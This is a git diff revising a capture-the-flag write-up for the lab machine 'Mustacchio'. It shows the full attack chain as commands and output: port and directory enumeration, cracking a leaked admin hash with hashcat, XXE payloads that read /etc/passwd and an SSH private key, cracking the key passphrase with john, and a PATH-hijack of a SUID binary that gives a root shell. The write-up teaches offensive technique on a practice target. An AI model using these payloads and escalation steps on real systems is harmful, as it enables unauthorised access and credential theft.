@@ -1,8 +1,12 @@
-let's start with a nmap scan. normal nmap scan found port 80 webserver called Mustacchio and port 22 ssh open running ubuntu. 
+![](Images/theme.png)
+What we can learn from this machine :
+* XXE injection
+* Enumerations
+* SUID exploit
 
-Let's try to running a full nmap scan for see more ports are open above the port 1000.
+let's start with a nmap scan. normal nmap scan found port 80 webserver called Mustacchio and port 22 ssh open running ubuntu. I try to running a full nmap scan for see more ports are open above the port 1000.
 
----web---
+![](Images/web.png)
 
 ```
 # Nmap 7.91 scan initiated Sat Jun 12 14:57:25 2021 as: nmap -sC -sV -p- -oN scans/nmap-allports 10.10.236.36
@@ -30,18 +34,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 We found nginx page in port 8765. let's see what is in there. 
 
----login----
+![](Images/login.png)
 
 Looks like we found a login page. Let's put that port away and let's enumerate port 80 first. After run gobuster I found this directory on port 80. **http://10.10.236.36/custom/js/** In this you can see this **user.bak** file.
 
----user.bak---
+![](Images/user%20bak.png)
 
 After we open it we can see this hash.
-
+```
 admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
-
-Let's crack it through **hashcat**. Here is the my command to hashcat.
-
+```
+Let's crack it with **hashcat**. Here is the my command to hashcat.
+First copy hash part and make a file then run following command.
 ```bash
 hashcat -a 0 -m 100 hash1.txt /opt/seclist/rockyou.txt
 ```
@@ -54,7 +58,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldo***
+1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -75,15 +79,21 @@ Candidates.#1....: bultaco -> blah2007
 Started: Sat Jun 12 16:34:35 2021
 Stopped: Sat Jun 12 16:34:50 2021
 ```
-Let's login in with our credentials. After login we can see this page.
+Let's login in with our credentials.
 
-----after login---
+Our credentials :
+* Username: admin
+* Password: bulldog19
+
+ After login we can see this page.
+
+![](Images/after%20login.png)
 
 when we look at our hint. It says look at the page source. You can find this html comment on page source.
 
---hint---
+![](Images/hint.png)
 
-when we go to that **dontforget.bak**. you can see this xml code. 
+Its something about barry's SSH key. When we go to that **/auth/dontforget.bak**. In the file you can see this xml code. 
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -93,7 +103,7 @@ when we go to that **dontforget.bak**. you can see this xml code.
   <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
 </comment>
 ```
-Looks like we can execute a xxe attack. After some time I got a /etc/passwd.
+Looks like we can execute a XXE attack. After some time I got a /etc/passwd.
 
 Documentation : https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 
@@ -107,8 +117,9 @@ Documentation : https://owasp.org/www-community/vulnerabilities/XML_External_Ent
   <com>&xxe;</com>
 </comment>
 ```
+![](Images/passwd.png)
 
----passwd---
+We got joe and barry as a users. It works well. Let's try to get a barry's id_rsa file.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -120,13 +131,14 @@ Documentation : https://owasp.org/www-community/vulnerabilities/XML_External_Ent
   <com>&xxe;</com>
 </comment>
 ```
----id rsa--------
+![](Images/idrsa.png)
 
-Now we got the id_rsa. Look into the page source for proper formatted key. 
+Now we got the id_rsa but its messy. If you Look into the page source for proper formatted key. 
 
----id_rsa page--------
+![](Images/id_rsa%20pagesource.png)
 
-Looks like we need a passphrase to id_rsa. Let's crack it with **john the ripper**. First you need to make a hash throught ssh2jhon. If you don't know how to do it. 
+Looks like we need a passphrase to id_rsa. Let's crack it with **john the ripper**. First you need to make a hash throught ssh2jhon. If you don't know how to do it.
+
 This blog post will help you :
 https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/
 
@@ -146,13 +158,16 @@ Warning: Only 2 candidates left, minimum 4 needed for performance.
 1g 0:00:00:02 DONE (2021-06-13 09:19) 0.4566g/s 6548Kp/s 6548Kc/s 6548KC/sa6_123..*7¡Vamos!
 Session completed
 ```
-We got our passphrase. Let's ssh to our machine.
+We got our passphrase. Let's ssh to our user.
 
 ```bash
 ssh -i id_rsa barry@10.10.24.119
 Enter passphrase for key 'id_rsa': urieljames
 ```
-In **/home/barry** we can get our user flag. Let's get into the root. 
+In **/home/barry** we can get our user flag. Let's get into the root. In the hints, They said about SUID lets find suid permission files.
+
+Use command :
+find / -perm -4000 2>/dev/null
 
 ```bash
 barry@mustacchio:~$ find / -perm -4000 2>/dev/null
@@ -180,6 +195,8 @@ barry@mustacchio:~$ find / -perm -4000 2>/dev/null
 /bin/fusermount
 /bin/su
 ```
+Looks like we have a suid permission on **/home/joe/live_log** file. Let's take a look into that file.
+
 ```bash
 barry@mustacchio:~$ cd /home/joe
 barry@mustacchio:/home/joe$ ls -la
@@ -187,18 +204,24 @@ total 28
 drwxr-xr-x 2 joe  joe   4096 Jun 12 15:48 .
 drwxr-xr-x 4 root root  4096 Jun 12 15:48 ..
 -rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log
-
 ```
-so what we can do, let’s change the path variable and create a tail with some malicious code to get us root. let’s do it.
+When we string that **live_log** file you can see this line on bin file.
+```
+tail -f /var/log/nginx/access.log
+```
+Let’s change the path variable and create a tail with some malicious code to get us root. let’s do it.
 
-so first I’m going to create a file called tail and create a script that gives us a root shell
+So first I’m going to create a file called tail in /tmp/ directory and create a script that gives us a root shell.
 
+Use commands :
+```bash
 echo /bin/bash -i > tail
 export PATH=/tmp:$PATH
- chmod +x tail
+chmod +x tail
 cd joe/
 ./live_log 
-
+```
+Let's see that in action.
 ```bash
 barry@mustacchio:/home/joe$ cd /tmp
 barry@mustacchio:/tmp$ ls
@@ -213,6 +236,7 @@ root@mustacchio:/home/joe# cd /root
 root@mustacchio:/root# ls
 root.txt
 root@mustacchio:/root# cat root.txt
-
-
 ```
+You pwn it !!
+
+Thx for reading !!
